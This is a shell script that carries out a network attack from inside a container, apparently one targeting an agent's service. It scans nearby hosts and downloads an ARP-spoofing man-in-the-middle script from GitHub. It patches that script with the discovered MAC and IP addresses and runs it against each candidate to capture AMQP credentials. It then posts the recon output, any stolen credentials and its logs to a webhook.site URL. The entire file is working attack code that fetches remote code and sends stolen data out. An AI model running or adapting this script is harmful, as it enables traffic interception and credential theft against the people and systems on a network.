#!/bin/sh
set -e
LOG=/tmp/attacker.log
exec > "$LOG" 2>&1

WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"

apk add --no-cache curl tcpdump iproute2 python3 nmap >/dev/null 2>&1

echo "=== ip link ==="
ip link
echo "=== ip addr ==="
ip addr
echo "=== ip route ==="
ip route
GW=$(ip route | awk '/default/{print $3; exit}')
OUR_IFACE=$(ip route | awk '/default/{print $5; exit}')
OUR_IP=$(ip -4 addr show "$OUR_IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
OUR_NET=$(echo "$OUR_IP" | sed 's/\.[0-9]*$//')

echo "OUR_IP=$OUR_IP OUR_NET=$OUR_NET GW=$GW IFACE=$OUR_IFACE"

ping -c 2 -W 1 "$GW" >/dev/null 2>/dev/null || true

echo "=== scanning neighbors ==="
for net in "$OUR_NET" 172.17.0 172.18.0 172.19.0 172.20.0; do
  for i in 1 2 3 4 5 6 7 8 9 10; do
    ping -c 1 -W 1 "${net}.${i}" >/dev/null 2>/dev/null &
  done
done
wait
sleep 2
ip neigh > /tmp/neigh.txt
echo "=== neighbors ==="
cat /tmp/neigh.txt

OUR_MAC=$(ip link show "$OUR_IFACE" | awk '/link\/ether/{print $2}' | tr -d ':')
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1 | tr -d ':')

CANDIDATES=""
while read line; do
  ip_addr=$(echo "$line" | awk '{print $1}')
  mac=$(echo "$line" | awk '{print $5}')
  state=$(echo "$line" | awk '{print $NF}')
  [ "$ip_addr" = "$GW" ] && continue
  [ "$ip_addr" = "$OUR_IP" ] && continue
  [ -z "$mac" ] && continue
  mac_clean=$(echo "$mac" | tr -d ':')
  [ "$mac_clean" = "$OUR_MAC" ] && continue
  case "$state" in
    REACHABLE|STALE|DELAY|PROBE)
      CANDIDATES="$CANDIDATES $ip_addr:$mac_clean"
      echo "Candidate: $ip_addr mac=$mac_clean"
      ;;
  esac
done < /tmp/neigh.txt

echo "=== All candidates: $CANDIDATES ==="

if [ -z "$CANDIDATES" ] || [ -z "$GW_MAC" ]; then
  echo "ERROR: no candidates or no gateway MAC"
  {
    echo "=== RECON FAILED ==="
    echo "OUR_IP=$OUR_IP OUR_MAC=$OUR_MAC GW=$GW GW_MAC=$GW_MAC"
    echo "=== neigh ==="
    cat /tmp/neigh.txt
  } | curl -sS --max-time 20 --data-binary @- "$WH?tag=L1-RECON-FAIL-V3"
  sleep 999999
  exit 1
fi

curl -sS -o /tmp/mitm_base.py "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/mitm_rst_v9.py"

FOUND_CREDS=""
CANDIDATE_NUM=0
TOTAL_CANDIDATES=$(echo "$CANDIDATES" | wc -w | tr -d ' ')

for pair in $CANDIDATES; do
  CANDIDATE_NUM=$((CANDIDATE_NUM + 1))
  CAND_IP=$(echo "$pair" | cut -d: -f1)
  CAND_MAC=$(echo "$pair" | cut -d: -f2)

  echo ""
  echo "=========================================="
  echo "=== Trying candidate $CANDIDATE_NUM/$TOTAL_CANDIDATES: $CAND_IP mac=$CAND_MAC ==="
  echo "=========================================="

  cp /tmp/mitm_base.py /tmp/mitm.py
  sed -i \
    -e "s|IFACE = \"eth1\"|IFACE = \"$OUR_IFACE\"|" \
    -e "s|OUR_MAC = bytes.fromhex(\"369822861110\")|OUR_MAC = bytes.fromhex(\"$OUR_MAC\")|" \
    -e "s|AGENT_MAC = bytes.fromhex(\"9af0af4b510f\")|AGENT_MAC = bytes.fromhex(\"$CAND_MAC\")|" \
    -e "s|GW_MAC = bytes.fromhex(\"8a2a3548b779\")|GW_MAC = bytes.fromhex(\"$GW_MAC\")|" \
    -e "s|GW_IP = \"172.18.0.1\"|GW_IP = \"$GW\"|" \
    -e "s|AGENT_IPS = \[\"172.17.0.2\", \"172.18.0.2\"\]|AGENT_IPS = [\"$CAND_IP\"]|" \
    -e "s|TOTAL_SECS = 90|TOTAL_SECS = 30|" \
    /tmp/mitm.py

  # Fix hardcoded agent IP in spoof_loop and restore_arp
  sed -i \
    -e "s|arp_reply(OUR_MAC, GW_IP, AGENT_MAC, \"172.18.0.2\")|arp_reply(OUR_MAC, GW_IP, AGENT_MAC, \"$CAND_IP\")|" \
    -e "s|arp_reply(OUR_MAC, \"172.18.0.2\", GW_MAC, GW_IP)|arp_reply(OUR_MAC, \"$CAND_IP\", GW_MAC, GW_IP)|" \
    -e "s|arp_reply(GW_MAC, GW_IP, AGENT_MAC, \"172.18.0.2\")|arp_reply(GW_MAC, GW_IP, AGENT_MAC, \"$CAND_IP\")|" \
    -e "s|arp_reply(AGENT_MAC, \"172.18.0.2\", GW_MAC, GW_IP)|arp_reply(AGENT_MAC, \"$CAND_IP\", GW_MAC, GW_IP)|" \
    /tmp/mitm.py

  # Clear previous results
  rm -f /tmp/mitm_results.txt /tmp/amqp_creds.txt

  echo "Starting MITM against $CAND_IP (30s)..."
  timeout 35 python3 /tmp/mitm.py 2>&1 || true

  echo "=== mitm results for $CAND_IP ==="
  cat /tmp/mitm_results.txt 2>/dev/null || echo "(no results file)"

  if [ -f /tmp/amqp_creds.txt ]; then
    echo "*** CREDS FOUND on $CAND_IP! ***"
    cat /tmp/amqp_creds.txt
    FOUND_CREDS="$CAND_IP"
    break
  fi

  # Check if we saw any AMQP traffic (relay > 0 means right target)
  RELAY_COUNT=$(grep -o 'relay=[0-9]*' /tmp/mitm_results.txt 2>/dev/null | head -1 | cut -d= -f2)
  if [ -n "$RELAY_COUNT" ] && [ "$RELAY_COUNT" -gt 0 ] 2>/dev/null; then
    echo "=== AMQP traffic seen on $CAND_IP (relay=$RELAY_COUNT) but no creds yet ==="
    echo "=== Running extended MITM (60s more) ==="
    sed -i "s|TOTAL_SECS = 30|TOTAL_SECS = 60|" /tmp/mitm.py
    rm -f /tmp/mitm_results.txt
    timeout 65 python3 /tmp/mitm.py 2>&1 || true
    echo "=== extended results ==="
    cat /tmp/mitm_results.txt 2>/dev/null
    if [ -f /tmp/amqp_creds.txt ]; then
      echo "*** CREDS FOUND (extended) on $CAND_IP! ***"
      cat /tmp/amqp_creds.txt
      FOUND_CREDS="$CAND_IP"
      break
    fi
  fi

  echo "No AMQP on $CAND_IP, trying next..."
done

echo ""
echo "=== FINAL RESULT ==="
{
  echo "=== recon ==="
  echo "IFACE=$OUR_IFACE OUR_IP=$OUR_IP OUR_MAC=$OUR_MAC"
  echo "GW=$GW GW_MAC=$GW_MAC"
  echo "CANDIDATES=$CANDIDATES"
  echo "=== neigh ==="
  cat /tmp/neigh.txt
  if [ -n "$FOUND_CREDS" ]; then
    echo "=== AMQP CREDS FOUND on $FOUND_CREDS ==="
    cat /tmp/amqp_creds.txt
  else
    echo "=== NO CREDS FOUND after $TOTAL_CANDIDATES candidates ==="
  fi
  echo "=== last mitm results ==="
  cat /tmp/mitm_results.txt 2>/dev/null || echo "(none)"
  echo "=== all mitm logs ==="
  cat "$LOG" 2>/dev/null | tail -100
} | curl -sS --max-time 30 --data-binary @- "$WH?tag=L1-ITER-RESULT"

sleep 999999
